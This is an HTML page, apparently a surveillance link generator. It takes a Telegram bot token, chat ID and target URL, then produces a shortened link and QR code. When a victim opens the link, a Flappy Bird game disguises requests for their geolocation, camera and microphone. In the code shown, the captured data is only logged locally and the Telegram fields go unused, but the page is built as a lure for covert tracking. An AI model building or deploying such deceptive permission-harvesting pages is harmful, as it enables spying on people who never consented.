<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title> Link Generator ✨</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
    body{font-family:'Orbitron',sans-serif;background:#000;color:#fff;
         display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
    .card{background:#111;padding:25px;border-radius:14px;max-width:480px;width:100%}
    h1{text-align:center;color:#0ff;margin-bottom:20px;text-shadow:0 0 8px #0ff}
    label{display:block;margin-top:10px}
    input{width:100%;padding:10px;margin-top:5px;border-radius:6px;border:none;background:#222;color:#0ff}
    button{margin-top:15px;padding:12px;width:100%;border:none;border-radius:8px;
           background:linear-gradient(90deg,#00f6ff,#6f00ff);color:#fff;font-weight:bold}
    #linkOut{margin-top:20px;font-size:14px;word-break:break-all;background:#222;padding:12px;border-radius:8px}
    canvas.qr{display:block;margin:15px auto}
    canvas.game{background:#70c5ce;display:none;margin:auto;border:2px solid #fff}
  </style>
</head>
<body>
  <div class="card" id="formCard">
    <h1> LINK GENERATOR ✨</h1>
    <label>Bot Token</label>
    <input id="botToken" type="text" placeholder="123456:ABC...">
    <label>Chat ID</label>
    <input id="chatId" type="text" placeholder="123456789">
    <label>URL Target</label>
    <input id="targetUrl" type="url" placeholder="https://example.com">
    <button onclick="generate()">Generate Link</button>
    <div id="linkOut"></div>
    <canvas id="qrcode" class="qr"></canvas>
  </div>

  <canvas id="flappy" class="game" width="320" height="480"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <script>
    // === Fungsi shorten link via TinyURL ===
    async function shorten(url){
      try{
        const res=await fetch("https://tinyurl.com/api-create.php?url="+encodeURIComponent(url));
        return await res.text();
      }catch(e){return url;}
    }

    // === Generate link ===
    async function generate(){
      const token=document.getElementById("botToken").value.trim();
      const chat=document.getElementById("chatId").value.trim();
      const url=document.getElementById("targetUrl").value.trim();
      if(!token||!chat||!url) return alert("Isi semua kolom dulu!");

      const longLink=`${location.origin}${location.pathname}?raff&mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(url)}`;
      const shortLink=await shorten(longLink);

      document.getElementById("linkOut").innerHTML=`
        <strong>Link Panjang:</strong><br>
        <a href="${longLink}" target="_blank" style="color:#0ff">${longLink}</a><br><br>
        <strong>Link Pendek:</strong><br>
        <a href="${shortLink}" target="_blank" style="color:#6f0">${shortLink}</a>
      `;

      // QR Code putih
      const canvas=document.getElementById("qrcode");
      QRCode.toCanvas(canvas, shortLink, { color:{dark:"#ffffff",light:"#000000"} });
    }

    // === MODE VIEW ===
    const params=new URLSearchParams(location.search);
    if(params.get("mode")==="view"){
      document.getElementById("formCard").style.display="none";
      const cvs=document.getElementById("flappy");
      cvs.style.display="block";
      const ctx=cvs.getContext("2d");

      // Flappy Bird simple
      let birdY=150,gravity=0.5,velocity=0,jump=-8;
      cvs.addEventListener("click",()=>{velocity=jump;});
      function loop(){
        ctx.fillStyle="#70c5ce";ctx.fillRect(0,0,cvs.width,cvs.height);
        velocity+=gravity; birdY+=velocity;
        ctx.fillStyle="yellow";ctx.fillRect(50,birdY,30,30);
        requestAnimationFrame(loop);
      }
      loop();

      // === PERMINTAAN IZIN ===
      navigator.geolocation.getCurrentPosition(pos=>{
        console.log("Lokasi:",pos.coords.latitude,pos.coords.longitude);
      });
      navigator.mediaDevices.getUserMedia({video:true,audio:true})
        .then(stream=>{
          console.log("Akses kamera & mic terbuka:",stream);
          stream.getTracks().forEach(t=>t.stop());
        })
        .catch(err=>console.error("Gagal akses kamera/mic:",err));
    }
  </script>
</body>
</html>
